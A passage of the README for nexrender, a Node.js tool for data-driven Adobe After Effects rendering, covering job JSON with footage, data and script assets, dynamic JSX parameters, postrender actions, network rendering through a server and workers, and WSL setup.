downloaded file, so it would be considered as an executable. You can do it by running: $ chmod 755 nexrender-cli-macos or more conveniently using the --file option $ nexrender-cli --file myjob.json Note: its recommended to run nexrender-cli -h at least once, to read all useful information about available options. More info: @nexrender/cli Assets We've successfully rendered a static project file using nexrender, however, there is no much point doing that unless we are going to add some dynamic data into the mix. A way to implement something like that is to add an asset to our job definition: // myjob.json { \"template\": { \"src\": \"file:///d:/documents/myproject.aep\", \"composition\": \"main\" }, \"assets\": [ { \"src\": \"file:///d:/images/myimage.png\", \"type\": \"image\", \"layerName\": \"background.png\" } ] } What we've done there is we told nexrender to use a particular asset as a replacement for something that we had defined in our aep project. More specifically, when rendering is gonna happen, nexrender will copy/download this asset file, and attempt to find and replace footage entry by specified layer name. Check out: detailed information about footage items. Actions You might've noticed that unless you added --skip-cleanup flag to our command, all rendered results will be deleted, and a big warning message will be shown every time you attempt to run the nexrender-cli with our job. The reason is that we haven't defined any actions that we need to do after we finished actual rendering. Let's fix that and add a simple one, copy. // myjob.json { \"template\": { \"src\": \"http://example.com/assets/myproject.aep\", \"composition\": \"main\" }, \"assets\": [ { \"src\": \"http://example.com/assets/myimage.png\", \"type\": \"image\", \"layerName\": \"background.png\" } ], \"actions\":{ \"postrender\": [ { \"module\": \"@nexrender/action-encode\", \"preset\": \"mp4\", \"output\": \"encoded.mp4\" }, { \"module\": \"@nexrender/action-copy\", \"input\": \"encoded.mp4\", \"output\": \"d:/mydocuments/results/myresult.mp4\" } ] } } We've just added a postrender action, that will occur right after we finished rendering. A module that we described in this case, is responsible for copying result file from a temp folder to the output folder. There are multiple built-in modules within nexrender ecosystem: @nexrender/action-copy @nexrender/action-encode @nexrender/action-upload @nexrender/action-cache (list will be expanded) Every module might have his own set of fields, however, module field is always there. Also, you might've noticed that actions is an object, however, we described only one (postrender) field in it. And there are more: predownload - can be used to modify the job before the assets are downloaded postdownload - can be used to modify the job after the assets are downloaded prerender - can be used to process data/assets just before the actual render will start. Also, if you are planning on having more than one action, please note: actions are order-sensitive, that means if you put let's say some encoding action after upload, the latter one might not be able to find a file that needs to be generated by former one, since the ordering was wrong. If you have at least some experience with Node.js, you might've noticed that the module definition looks exactly like a package name. And well, yes it is. When nexrender stumbles upon a module entry, it will try to require this package from internal storage, and then if no module has been found, it will attempt to look for globally installed Node.js modules with that name. That means if you are comfortable with writing Node.js code, you can easily create your own module, and use it by providing either absolute/relative path (on a local machine), or publishing the module and installing it globally on your target machine. npm i -g my-awesome-nexrender-action And then using it: { \"actions\":{ \"postrender\": [ { \"module\": \"my-awesome-nexrender-action\", \"param1\": \"something big\", \"param2\": 15 } ] } } Also, you can checkout packages made by other contributors across the network: Details Job structure has more fields, that we haven't checked out yet. The detailed version of the structure looks like this: { \"template\": { \"src\": String, \"composition\": String, \"frameStart\": Number, \"frameEnd\": Number, \"frameIncrement\": Number, \"continueOnMissing\": Boolean, \"settingsTemplate\": String, \"outputModule\": String, \"outputExt\": String, }, \"assets\": [], \"actions\": { \"predownload\": [], \"postdownload\": [], \"prerender\": [], \"postrender\": [], }, \"onChange\": Function, \"onRenderProgress\": Function, \"onRenderError\": Function } Majority of the fields are just proxied to the aerender binary, and their descriptions and default values can be checked here. onChange is a callback which will be triggered every time the job state is changed (happens on every task change). onRenderProgress is a callback which will be triggered every time the rendering progress has changed. onRenderError is a callback which will be triggered when arender encounters an error during its runtime. So far known errors are (please contribute): Errors from nexrender.jsx - most likely issue in the assets section within the job. No comp was found with the given name. - Composition from template.composition not present in the AE file. After Effects error: file is damaged. - AE file is broken and could not be opened (caused by incomplete transfer/download) Note: Callback functions are only available via programmatic use. For more information, please refer to the source code. Job States Note: Job states are mainly used for network rendering. If you are using nexrender-cli you can skip this section. Job can have state feild (job.state) be set to one of those values: created (default) queued (when pushed to the nexrender-server) picked (when somebody picked up job on nexrender-server) started (when worker started preparing and running the job) render:setup (bunch of states that are specific to each render step) render:predownload render:download render:postdownload render:prerender render:script render:dorender render:postrender render:cleanup finished (when worker successfully finished rendering the job) error (when worker got an error at any step starting from started state) Programmatic In case you are building your own application and just need to use a rendering part, or you wanna manually trigger jobs from your code, there is a way to use nexrender programmatically: Install the @nexrender/core $ npm install @nexrender/core --save And then load it, and run it const { render } = require('@nexrender/core') const main = async () => { const result = await render(/*myJobJson*/) } main().catch(console.error); Or you can go more advanced, and provide some settings as your 2nd argument to the render function: const { render } = require('@nexrender/core') const main = async () => { const result = await render(/*myJobJson*/, { workpath: '/Users/myname/.nexrender/', binary: '/Users/mynames/Apllications/aerender', skipCleanup: true, addLicense: false, debug: true, }) } main().catch(console.error); Information The module returns 2 methods, init and render. render calls init internally, if it sees that there were some options provided to render as 2nd argument. First one is responsible for setting up the env, checking if all needed patches for AE are in place, automatically adding render-only license file for a free usage of Adobe's product (unless disabled), and a few other minor things. Second one is responsible for mainly job-related operations of the full cycle: downloading, rendering, processing, and uploading. init accepts an object, containing additional options: workpath - string, manually set path to working directory where project folder will be created, overrides default one in system temp folder binary - string, manually set path pointing to the aerender(.exe) binary, overrides auto found one debug - boolean, enables or disables debug mode, false by default skipCleanup - boolean, providing true will prevent nexrender from removing the temp folder with project (false by default) skipRender - boolean, providing true will prevent nexrender from running actual rendering, might be useful if you only want to call scripts multiFrames - boolean, providing true will attmpt to use aerender's built-in feature of multi frame rendering (false by default) reuse - boolean, false by default, (from Adobe site): Reuse the currently running instance of After Effects (if found) to perform the render. When an already running instance is used, aerender saves preferences to disk when rendering has completed, but does not quit After Effects. If this argument is not used, aerender starts a new instance of After Effects, even if one is already running. It quits that instance when rendering has completed, and does not save preferences. maxMemoryPercent - integer, undefined by default, check original documentation for more info imageCachePercent - integer, undefined by default, check original documentation for more info addLicense - boolean, providing false will disable ae_render_only_node.txt license file auto-creation (true by default) forceCommandLinePatch - boolean, providing true will force patch re-installation wslMap - String, set WSL drive map, check wsl for more info More info: @nexrender/core Using the ${workPath} mask in @nexrender/action-encode The output of @nexrender/action-encode is always prepended by the working path of the job, so you don't have to guess paths. However if you want to use the working path of the job for something else such as encoding in multiple bitrates it is necessary to use the ${workPath} mask. This is especially useful for HLS encoding //HLS encoding { \"module\": \"@nexrender/action-encode\", \"output\": \"encoded_playlist_%v.m3u8\", \"params\": { \"-acodec\": \"aac\", \"-vcodec\": \"libx264\", \"-pix_fmt\": \"yuv420p\", \"-map\": [ \"0:0\", \"0:0\", \"0:0\" ], \"-b:v:0\": \"2000k\", \"-b:v:1\": \"1000k\", \"-b:v:2\": \"500k\", \"-f\": \"hls\", \"-hls_time\": \"10\", \"-hls_list_size\": \"0\", \"-var_stream_map\": \"v:0,name:high v:1,name:medium v:2,name:low\", \"-master_pl_name\": \"master.m3u8\", \"-hls_segment_filename\": \"${workPath}\\\\encoded%d_%v.ts\" } } The -hls_segment_filename flag requires the absolute paths or else it would save on the working path of the nexrender application hence the use of ${workPath} Template rendering One of the main benefits of using nexrender is an ability to render projects using data other than what has been used while the project has been created. Data means any sort of source/footage material, it can be images, audio tracks, video clips, text strings, values for colors/positions, even dynamic animations using expressions. All of those things can be replaced for every job without even opening a project file or starting After Effects. Note: Also this process can be called in other ways: templated, data-driven or dynamic video generation. This approach allows you to create a .aep file once, and then reuse it for as many target results as you need to. However, what is needed to get started? Footage items Footage item replacement is what briefly has been covered in the Job section of this document. The idea is quite simple, you describe which asset will replace existing described footage item in a specific layer, by specifying src, and one of the layerName or layerIndex options. Fields src: string, a URI pointer to the specific resource, check out supported protocols type: string, for footage items, is one of (image, audio, video) layerName: string, target layer name in the After Effects project layerIndex: integer, can be used instead of layerName to select a layer by providing an index, starting from 1 (default behavior of AE jsx scripting env) composition: string, composition where the layer is, useful for searching layer in specific compositions. If none is provided, it uses the wildcard composition \"*\", that will result in a wildcard composition matching, and will apply this data to every matching layer in every matching composition. If you want to search in a nested composition you can provide a path to that composition using \"->\" delimiter. For example, \"FULL_HD->intro->logo comp\" matches a composition named logo comp that is used in composition intro which in turn is used in composition FULL_HD. Note, that FULL_HD doesn't have to be the root composition. Make sure to specify a composition name, not a layer name. name: string, and optional filename that the asset will be saved as, if not provided the layerName or the basename of the file will be used extension: string, an optional extension to be added to the filename before it is sent for rendering. This is because After Effects expects the file extension to match the content type of the file. If none is provided, the filename will be unchanged. useOriginal: boolean, an optional feature specific to the file:// protocol, that prevents nexrender from copying an asset to local temp folder, and use original instead Specified asset from src field will be downloaded/copied to the working directory, and just before rendering will happen, a footage item with specified layerName or layerIndex in the original project will be replaced with the freshly downloaded asset. This way you (if you are using network rendering) you can not only deliver assets to the target platform but also dynamically replace them. Note: if layerName is used for footage file asset, it should always contain the extension in the name as well. Example { \"assets\": [ { \"src\": \"https://example.com/assets/image.jpg\", \"type\": \"image\", \"layerName\": \"MyNicePicture.jpg\" }, { \"src\": \"https://example.com/assets/jpeg-without-extension\", \"type\": \"image\", \"layerName\": \"MyOtherNicePicture.jpg\", \"extension\": \"jpg\" }, { \"src\": \"file:///home/assets/audio.mp3\", \"type\": \"audio\", \"name\": \"music.mp3\", \"layerIndex\": 15 } ] } Original source For file protocol based assets (assets coming from local filesystem/shared network), you can provide additional option useOriginal, that would force nexrender to use an original file rather than creating a local copy inside of the temp rendering folder. That could be useful for large asset files, that would otherwise take a long time to copy. Example { \"assets\": [ { \"src\": \"file:///D:/assets/MyBigAsset.wav\", \"type\": \"audio\", \"useOriginal\": true, \"layerIndex\": 15 } ] } Static assets There is also a plain asset type that allows you to simply provide an src, and that file will be downloaded in the folder with the project. No additional automated actions will happen with that asset, unless you manually use scripting to do something with those. Might be useful for some static data-based injections, or some other use cases. Example: { \"assets\": [ { \"src\": \"http://example.com/assets/something.json\", \"type\": \"static\" }, { \"src\": \"http://example.com/assets/something_else.csv\", \"name\": \"mydata.csv\", \"type\": \"static\" } ] } Data Assets The second important point for the dynamic data-driven video generation is the ability to replace/change/modify non-footage data in the project. To do that a special asset of type data can be used. Fields type: string, for data items, is always data layerName: string, target layer name in the After Effects project layerIndex: integer, can be used instead of layerName to select a layer by providing an index, starting from 1 (default behavior of AE jsx scripting env) property: string, indicates which layer property you want to change value: mixed, optional, indicates which value you want to be set to a specified property expression: string, optional, allows you to specify an expression that can be executed every frame to calculate the value composition: string, composition where the layer is, useful for searching layer in specific compositions. If none is provided, it uses the wildcard composition \"*\", that will result in a wildcard composition matching, and will apply this data to every matching layer in every matching composition. If you want to search in a nested composition you can provide a path to that composition using \"->\" delimiter. For example, \"FULL_HD->intro->logo comp\" matches a composition named logo comp that is used in composition intro which in turn is used in composition FULL_HD. Note, that FULL_HD doesn't have to be the root composition. Make sure to specify a composition name, not a layer name. Since both value and expression are optional you can provide them in any combination, depending on the effect you want to achieve. Providing value will set the exact value for the property right after execution, and providing an expression will make sure it will be evaluated every frame. Note: If you are not sure what expressions are, and how to use them, please refer to this page And if you are not sure what is a property and where to get it you can refer to this image: Property Example As you can see there are a few Property Groups like Text, Masks, Transform that include actual properties. Those properties are what can be used as a target. In case you need to change some deep properties, like show on this image: You can do that by providing the property name using a dot . separator. (Example: \"Effects.Skin_Color.Color\") In case your property already has . in the name, and you are sure it will lead to a collision, while parsing, you can also use arrow symbol -> instead. You can also change the deeper attributes of properties, for example the font of a text layer using \"Source Text.font\" or the font size by \"Source Text.fontSize\". Example { \"assets\": [ { \"type\": \"data\", \"layerName\": \"MyNicePicture.jpg\", \"property\": \"Position\", \"value\": [500, 100] }, { \"type\": \"data\", \"layerName\": \"my text field\", \"property\": \"Source Text\", \"expression\": \"time > 100 ? 'Bye bye' : 'Hello world'\" }, { \"type\": \"data\", \"layerName\": \"my text field\", \"property\": \"Source Text.font\", \"value\": \"Arial-BoldItalicMT\" }, { \"type\": \"data\", \"layerName\": \"background\", \"property\": \"Effects.Skin_Color.Color\", \"value\": [1, 0, 0] }, { \"type\": \"data\", \"layerIndex\": 15, \"property\": \"Scale\", \"expression\": \"[time * 0.1, time * 0.1]\" }, ] } Note: any error in expression will prevent the project from rendering. Make sure to read error messages reported by After Effects binary carefully. Script Asset NEW: Now you can pass arguments to JSX dynamically! Read below for more information The last and the most complex and yet the most powerful is an ability to execute custom jsx scripts just before the rendering will start. This approach allows you to do pretty much anything that is allowed for scripting, like creating/removing layers, adding new elements, restructuring the whole composition, and probably much more. Now, actual complexity happens only from the side of actual scripting, you need to have some basic knowledge of ExtendScript Toolkit, and from the nexrender side everything is quite simple. You only need to provide an src pointing towards script resource and set up proper type. Fields src: string, a URI pointer to the specific resource, check out supported protocols type: string, for script items, is always script keyword: (optional) string, name for the configuration object holding all the dynamically injected parameters. Defaults to NX parameters: (optional) object, object where all the dynamically injected parameters are defined. Variables not defined here but used in the script are null by default. globalDefaultValue (optional) any, The default value of any found unknown or undefined value for any given keyword child object keyis null. However this can be changed by setting this parameter to something. You should be careful on which default to set, it is suggested to leave it as it is and check for null values in your JSX code. Dynamic Parameters With dynamic parameters you can set a parameter in your Job declaration to be used on a JSX Script! Each parameter object must have the following: key (required) : The key of the variable. Example: Key = dog => NX.dog. value (required) : The target value for the variable. Example: Key = dog, Value = \"doggo\" => NX.dog = \"doggo\". See Supported Parameter Types. Supported Parameter Types We currently support all standard JSON Parameters with the addition of javascript functions, which can be named, anonymous or self-invoking. string number array object null (default) functions Parameter Types examples String \"parameters\" : [ { \"key\" : \"fullName\", \"value\": \"John Doe\" } ] Number \"parameters\" : [ { \"key\" : \"orangeAmount\", \"value\": 37 } ] Array \"parameters\" : [ { \"key\" : \"officesList\", \"value\": [\"Santiago\", \"London\", \"Paris\", \"Kyoto\", \"Hong-Kong\"] } ] Object \"parameters\" : [ { \"key\" : \"carDetails\", \"value\": { \"model\" : \"Tesla Model S\", \"maxBatteryLife\" : 500000, \"color\" : \"vermilion\" } } ] Null This is the default value for parameters used on any given JSX script that are not initializated. \"parameters\" : [ { \"key\" : \"carDetails\" } ] NX.get(\"carDetails\") will be equal to null. Functions Functions are useful if you need some dynamic calculation of specific values. You can use them in conjuction with other dynamic parameters as well. Currently we support Self-invoking Functions, Named Functions and Anonymous Functions. After Effects ExtendedScript does not support arrow functions at the moment (cc 2020). Warnings You must only use one function per parameter; If there's more than one function defined in the parameter value the job will crash due to limitations in function detection and parsing. Use well-formed functions and be aware of the computational weight of your functions. Malformed functions will cause the script to fail and subsequently the job to crash. Self-Invoking Functions Example Self-invoking functions are useful to use in a string concatenation or places where you need a value result from the function and not to redeclare it. \"parameters\" : [ { \"key\" : \"twoPlusTwo\", \"value\": \"(function() { return 1+1; })()\" } ] The above function could be use in a string concatenation such as alert(\"Miss what's the mathematical operation required to compute the number\" + NX.get(\"twoPlusTwo\") + \" ?\"); // A typical second grade question. \"parameters\" : [ { \"key\" : \"invitees\", \"value\": [\"Steve\", \"Natasha\", \"Tony\", \"Bruce\", \"Wanda\", \"Thor\", \"Peter\", \"Clint\" ] }, { \"key\" : \"eventInvitation\", \"value\": \"(function (venue) { alert( 'This years\\' Avengers Gala is on the prestigious ' + venue.name + ' located at ' + venue.location + '. Our special guests ' + NX.get('invitees').value.map(function (a, i) { return (i == NX.get('invitees').value.length - 1) ? ' and ' + a + ' (whoever that is)' : a + ', '; }).join('') + ' going to be present for the ceremony!'); })({ name: NX.arg('venue'), location: NX.arg('location') })\", \"arguments\": [ { \"key\" : \"venue\", \"value\" : \"Smithsonian Museum of Natural History\" }, { \"key\" : \"location\", \"value\": \"10th St. & Constitution Ave.\" } ] } ] This convoluted function would return a lovely invitation string to an event using a dynamic parameter set on the json Job, as well as having additional required parameters with their defaults and could be used as follows: alert(NX.get(\"eventInvitation\")); // Output: /* This years' Avengers Gala is on the prestigious Smithsonian Museum of Natural History located at 10th St. & Constitution Ave. Our special guests Steve, Natasha,Tony, Wanda, Thor, Peter and Clint (whoever that is) are going to be present for the ceremony! */ Named Functions \"parameters\" : [ { \"key\" : \"sum\", \"value\": \"function namedSumFunction(a, b) { return a + b; }\" } ] var result = NX.call(\"sum\", [400, 20]); // 420 Note that the usage of the named method is sum and not namedSumFunction due to JS' hoisting, so named functions are implemented and used the same was as anonymous functions. Anonymous Functions \"parameters\" : [ { \"key\" : \"sumValues\", \"value\": \"function (a, b) { return a + b; }\" } ] var result = NX.call(\"sumValues\", [400, 20]); // 420 Complete functions example { \"template\": { \"src\": \"file:///template.aep\", \"composition\": \"BLANK_COMP\" }, \"assets\": [ { \"src\": \"file:///sampleParamInjection.jsx\", \"type\": \"script\", \"parameters\": [ { \"type\": \"array\", \"key\" : \"dogs\", \"value\": [ \"Captain Sparkles\", \"Summer\", \"Neptune\"] }, { \"type\" : \"number\", \"key\" : \"anAmount\" }, { \"type\": \"function\", \"key\": \"getDogsCount\", \"value\" : \"function() { return NX.get('dogs').length; }\" }, { \"type\": \"function\", \"key\": \"exampleFn\", \"value\": \"function ( parameter ) { return parameter; }\" }, { \"type\" : \"function\", \"key\" : \"dogCount\", \"value\" : \"(function(length) { return length })(NX.arg('dogCount'))\", \"arguments\": [ { \"key\" : \"dogCount\", \"value\": [\"NX.call('exampleFn', [NX.call('getDogsCount') + NX.get('anAmount')])\"] } ] } ] } ] } Examples No dynamic parameters. { \"assets\": [ { \"src\": \"http://example.com/scripts/myscript.jsx\", \"type\": \"script\" } ] } Dynamic variable - Array type parameter \"assets\": [ { \"src\": \"file:///C:/sample/sampleParamInjection.jsx\", \"type\": \"script\", \"parameters\": [ { \"key\": \"name\", \"value\": \"Dilip\" } ] } ] Default Dynamic Variable Keyword Parameter The value could be a variable or a function, but beware that there is no sanitization nor validation so if the input is malformed it could crash the job By default the keyword is set to NX, so you would call your variables or methods like NX.get(\"foo\") or NX.call(\"bar\", [\"sampleStringParameter\"]). To change this keyword simply set \"keyword\" as shown below: \"assets\": [ { \"src\": \"file:///C:/sample/sampleParamInjection.jsx\", \"type\": \"script\", \"keyword\": \"_settings\", \"parameters\": [ { \"key\": \"name\", \"value\": \"Dilip\" } ] } ] This way instead of NX.get(\"foo\") it would be _settings.get(\"foo\") All dynamic parameters used in the script should have a JSX default Example JSX Script with defaults: { return \"Hello \" + NX.get(\"name\") || \"John\"; } The code above will output either: \"Hello John\" if no parameter defined on the JSON parameters array or this parameter is missing. \"Hello NAME\" if parameter name has a value of NAME on the JSON parameters array. Example JSX Script without defaults: { // The code below will crash if it's executed directly in After Effects. See documentation on how to enable cross environment fault tolerance. return \"There are \" + NX.get(\"beerBottlesAmount\") + \" beer bottles ready to drink!\" } The code above will output either: \"There are null beer bottles ready to drink!\" if no parameter defined on the JSON parameters array. \"There are 20 beer bottles ready to drink!\" if parameter beerBottlesAmount has a value of 20 on the JSON parameters array. But don't you worry about missing any of the examples above; If you use a variable in your JSX with the default keyword and no initialization whatsoever, the console will output a handy initialization code snippet for both JSON and JSX for you to copy and modify with your own values! That pretty much covers basics of templated rendering. Network rendering We've covered basics on how to set up a minimal rendering flow using local cli machine rendering. Now, what if you want to start rendering on a remote machine, to reduce load while you are working on your local machine. Or maybe you need to render so many videos at once, that you will require a whole fleet of nodes running on some cloud cluster. With nexrender, you can quite quickly and easily spin up your own rendering cluster. Using binaries You can download compiled versions of binaries directly from the releases section, or install them using npm, whichever option works better for you. nexrender-server Description: A CLI application which is responsible for job management, worker node cooperation, communications with the nexrender-worker instances, and serves mainly as a producer in the nexrender network model. Technically speaking its a very tiny HTTP server running with a minimal version of REST API. Optional support for external databases can be added (like Redis, MongoDB, MySQL, etc.), with some of them already in place. Please check modules for more info. Supported platforms: Windows, macOS, Linux Requirements: None Example $ nexrender-server \\ --port=3050 \\ --secret=myapisecret More info: @nexrender/server nexrender-worker Description: A CLI application which is responsible mainly for actual job processing and rendering, communication with the nexrender-server, and serves mainly as a consumer in the nexrender network model. Supported platforms: Windows, macOS Requirements: Installed licensed/trial version of Adobe After Effects Example $ nexrender-worker \\ --host=https://my.server.com:3050 \\ --secret=myapisecret Note: its recommended to run nexrender-worker -h at least once, to read all useful information about available options. More info: @nexrender/worker Using API Now, after you've loaded up your worker and server nodes, they will need some jobs to be submitted to the server to start actual rendering. There are 2 main ways to do that, first one - just send a direct POST request to add a job to the server. curl \\ --request POST \\ --header \"nexrender-secret: myapisecret\" \\ --header \"content-type: application/json\" \\ --data '{\"template\":{\"src\":\"http://my.server.com/assets/project.aep\",\"composition\":\"main\"}}' \\ http://my.server.com:3050/api/v1/jobs Another option is to use already created API module for js: npm install @nexrender/api --save const { createClient } = require('@nexrender/api') const client = createClient({ host: 'http://my.server.com:3050', secret: 'myapisecret', }) const main = async () => { const result = await client.addJob({ template: { src: 'http://my.server.com/assets/project.aep', composition: 'main', } }) result.on('created', job => console.log('project has been created')) result.on('started', job => console.log('project rendering started')) result.on('progress', (job, percents) => console.log('project is at: ' + percents + '%')) result.on('finished', job => console.log('project rendering finished')) result.on('error', err => console.log('project rendering error', err)) } main().catch(console.error); More info: @nexrender/api Tested with Current software was successfully tested on: Adobe After Effects CS 5.5 [OS X 10.14.2] Adobe After Effects CC (version 12.1.168) [OS X 10.11.2, Windows 10 64bit] Adobe After Effects CC 2015 (version 13.6.0) [OS X 10.11.2] Adobe After Effects CC 2018.3 [Windows 2012 Server R2 Datacenter] Adobe After Effects CC 2019 [OS X 10.14.2, Windows Server 2019 (AWS)] Additional Information Protocols src field is a URI string, that describes path pointing to the specific resource. It supports a few different protocols: Built-in: file:// - file on a local file system, may include environment variables identified by a preceding $ sign (possibly a pipe? need testing) http:// - file on remote http server https:// - file on remote http server served via https data:// - URI encoded data, can be a base64 or plain text External: gs:// - @nexrender/provider-gs - Google Cloud Storage provider s3:// - @nexrender/provider-s3 - Amazon S3 provider ftp:// - @nexrender/provider-ftp - Node.js FTP provider (other protocols will be added there) Examples Here are some examples of src paths: file:///home/assets/image.jpg file:///d:/projects/project.aep file://$ENVIRONMENT_VARIABLE/image.jpg http://somehost.com:8080/assets/image.jpg?key=foobar https://123.123.123.123/video.mp4 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg== data:text/plain;charset=UTF-8,some%20data:1234,5678 WSL If running WSL (Windows Subsystem for Linux) you will need to configure your project a bit differently in order for it to render correctly. Linux Mapping You will need to pass in which drive letter Linux is mapped to in Windows. This is the Drive Letter in which you can access your Linux file system from Windows. Note: Drive mapping is setup when configuring WSL You can do this through the CLI like so assuming Linux is mapped to Z. $ nexrender-cli -f mywsljob.json -m \"Z\" or $ nexrender-cli -f mywsljob.json -wsl-map \"Z\" And you can do this Programmatically like const { render } = require('@nexrender/core') const main = async () => { const result = await render(/*myWSLJobJson*/, { skipCleanup: true, addLicense: false, debug: true, wslMap: \"Z\" }) } main().catch(console.error); Windows Pathing When referencing windows file system you will need to use /mnt/[DRIVE YOU WANT TO ACCESS]/[PATH TO YOUR FILE]. like so /mnt/d/Downloads/nexrender-boilerplate-master/assets/nm.png CLI Example nexrender-cli -f mywsljob.json -m \"Z\" -w /mnt/d/Downloads/tmp/nexrender Job Example { \"template\": { \"src\": \"file:///mnt/d/Downloads/nexrender-boilerplate-master/assets/nm05ae12.aepx\", \"composition\": \"main\", }, \"assets\": [ { \"src\": \"file:///mnt/d/Downloads/nexrender-boilerplate-master/assets/2016-aug-deep.jpg\", \"type\": \"image\", \"layerName\": \"background.jpg\" } ], \"actions\": { \"postrender\": [ { \"module\": \"@nexrender/action-encode\", \"output\": \"output.mp4\", \"preset\": \"mp4\" } ] } } Note: nexrender does not currently support custom root pathing WSL Binary If After Effects is installed into the default location nexrender should auto detected it. Otherwise you will need to provide its location following the Windows Pathing Guide. Example for if you installed After Effect onto your D drive. nexrender-cli -f mywsljob.json -b \"/mnt/d/Program Files/Adobe/Adobe After Effects 2020/Support Files/aerender.exe\" WSL Workpath By default nexrender will use your Linux /tmp folder to render out the jobs. We suggest changing this to a secondary drive as rendering can eat up disk space causing an issue where WSL does no release disk space back to Windows. Example under Windows Pathing Guide. Github Issue: WSL 2 should automatically release disk space back to the host OS WSL Memory It's also suggested that you create a .wslconfig file in your Windows user folder and limit the memory that can be used by WSL. Otherwise your rendering will crash on large projects. .wslconfig Example [wsl2] memory=4GB swap=0 localhostForwarding=true Github Issue: WSL 2 consumes massive amounts of RAM and doesn't return it Problems There might be a lot of problems creeping around, since this tool works as an intermediary and coordinator for a bunch of existing complex technologies, problems is something inescapable. However, we will try our best to expand and keep this section up to date with all possible caveats and solutions for those problems. macOS access: there might be issues with nexrender accessing the aerender binary within the Adobe library folder, or accessing /tmp folders. For more details refer to https://github.com/inlife/nexrender/issues/534 Development If you wish to contribute by taking an active part in development, you might need this basic tutorial on how to get started: clone the repo run npm install run npm start The last command will run lerna bootstrap action to setup dependencies for all packages listed in the packages/ folder, and link them together accordingly to their dependency relations. After that, you can start the usual development flow of writing code and testing it with npm start in a specific package. Why this multi-package structure has been chosen? It seemed like a much smarter and easier way to achieve a few things: separation of concerns, every module is responsible for a limited set of things modularity and plugin-friendly nature, which allows external packages to be used instead, or alongside built-in ones minimal dependency, as you might've noticed, packages in nexrender try to have as little dependencies as possible making it much easier to maintain and develop The recommended approach is to add only needed things as dependencies, it's better to take some time to research module that is being added to the project, to see how many its own dependencies it will introduce, and possibly find a better and smaller one, or even extract some specific feature into a new micro module. And of course, the main thing about development is that it should be fun. :) Project Values This project has a few principle-based goals that guide its development: Do our thing really well. Our thing is data-based automating of the rendering, and hanlding other interactive related components of that task set. It is not meant to be a replacement for specific corporate tools templater bot, rendergarden, etc. that have lots of features and customizability. (Some customizability is OK, but not to the extent that it becomes overly complicated or error-prone.) Limit dependencies. Keep the packages lightweight. Pure nodejs. This means no native module or other external/system dependencies. This package should be able to stand on its own and cross-compile easily to any platform -- and that includes its library dependencies. Idiomatic nodejs. Keep modules small, minimal exported names, promise based async handling. Be elegant. This package should be elegant to use and its code should be elegant when reading and testing. If it doesn't feel good, fix it up. Well-documented. Use comments prudently; explain why non-obvious code is necessary (and use tests to enforce it). Keep the docs updated, and have examples where helpful. Keep it efficient. This often means keep it simple. Fast code is valuable. Consensus. Contributions should ideally be approved by multiple reviewers before being merged. Generally, avoid merging multi-chunk changes that do not go through at least one or two iterations/reviews. Except for trivial changes, PRs are seldom ready to merge right away. Have fun contributing. Coding is awesome! Awesome External Packages Here you can find a list of packages published by other contributors: HarryLafranc/nexrender-action-handbrake - Encode a video with Handbrake on nexrender-postrender dberget/nexrender-action-cloudinary - Upload a video to Cloudinary platform dberget/nexrender-action-normalize-color - Normalize colors for each asset defined in options dylangarcia/nexrender-action-unzip - Unzip composition source before starting to render pilskalns/nexrender-action-template-unzip - Unzip template and find (first) .aep file within it. Minimal config. somename/package-name - a nice description of a nice package doing nice things Since nexrender allows to use external packages installed globally from npm, its quite easy to add your own modules Awesome Related Projects Jeewes/nerc - NERC: Tool for filling nexrender config templates with CSV data. newflight-co/createvid - A fully functional, full-stack web app built in Vue. Actively looking for community support. Custom Actions To add a custom pre- or post-render action, all you need to do is to create at least a single file, that is going to return a function with promise. // mymodule.js module.exports = (job, settings, action, type) => { console.log('hello from my module: ' + action.module); return Promise.resolve(); } To use that action locally you can then require it by either using relative or global path. Additionally you can create a private npm module and link it, so it would become visible globally or even publish it to npm/your own private repo and use it. // example 1 { \"module\": \"d:/myprojects/mymodule/index.js\", \"somearg1\": \"hello world\", \"somearg2\": 123456 } // example 2 { \"module\": \"my-super-cool-module\", \"somearg1\": \"hello world\", \"somearg2\": 123456 } // example 3 { \"module\": \"@myorg/mymodule\", \"somearg1\": \"hello world\", \"somearg2\": 123456 } From there you can build pretty much any module that could process downloaded data before starting rendering, or doing tranformations on data after, or just simply sending an email when rendering is finished. Note: both job and settings are mutable structures, any modifications made to them will reflect onto the flow of the next calls. Hence they can be used to store state between actions. Migrating from v0.x First version of nexrender was published in 2016, and it has been used by many people for quite some time since then. Even though version v1.x is based on the same concepts, it introduces major breaking changes that are incompatible with older version. However, majority of those changes were made to allow new, previously unimaginable things. Naming Nexrender Project -> Nexrender Job Nexrender Rendernode -> Nexrender Worker Nexrender API Server -> Nexrender Server Referring to project was confusing since it could be applied for both aep project and nexrender project. And rendernode name was quite too long, and unconvinient to use. Structure The structure of the job has changed, majority of the fields were moved from the root namespace, into \"template\" namespace, merging it with old \"project.settings\" namespace. Assets structure remained pretty much similar. A new object actions has been introduced. Assets Replaced http and file only assets to a URI based links, theoretically extendable without any limits. Many new other protocols and implementations can be added in a decentrilized manner. Strict division between asset types: [image, audio, video] - footage items, behave like files [data] - dynamic data assets, for direct value setting and expressions [script] - files allowing full scripting limitless scripting support Rendering The biggest change that happened, is removal of old hacky way of replacing assets and patching aepx file to write custom expressions. Instead it has been replaced with brand new, recently discovered ExtendScript based injection. It allows to do a few quite important things: Import and replace footage items via scripting, making it very reliable. (No more bugs related to same-system existing path override for aep project) Set/Replace text, expressins and other types of data via scripting. (No more bugs related to changes in aepx structure, and no need to use aepx format at all) Ability to run custom ExtendScript jsx scripts, which is limitless and revolutionary compared to previous version. CLI Project has been devided onto multiple subprojects, and mutiple cli applications as a result. Every cli application is auto-compiled to a platform specific executable on publish and auto-uploaded to the releases section. This allows anyone to use nexrender cli without installing a nodejs runtime onto target system. New CLI tool allows to run render directly from console for a local job, without need to start whole cluster. Worker, and CLI apps include minor QoL improvments, such as auto creation of the ae_render_only_node.txt file that allows free licensing, and After Effects folder auto detection. All tools include better help screen, and a lot of customization from command line arguments. Customers Technically, since the tool is free, customers should be called users. In any case this section describes a list of users or companies that are proud users of nexrender. If you've used nexrender, and you like it, please feel free to add yourself into the list. Noxcaos Music Two Bit Circus Flgerl NewFlight you name goes here Plans Features for next major release (v2.0.0): Ability to switch renderers for a job (none, aerender, media-encoder) Ability to push a job onto a server with ability to auto-split and render parts independently on the network API for tracking/managing active workers in the network Algo of 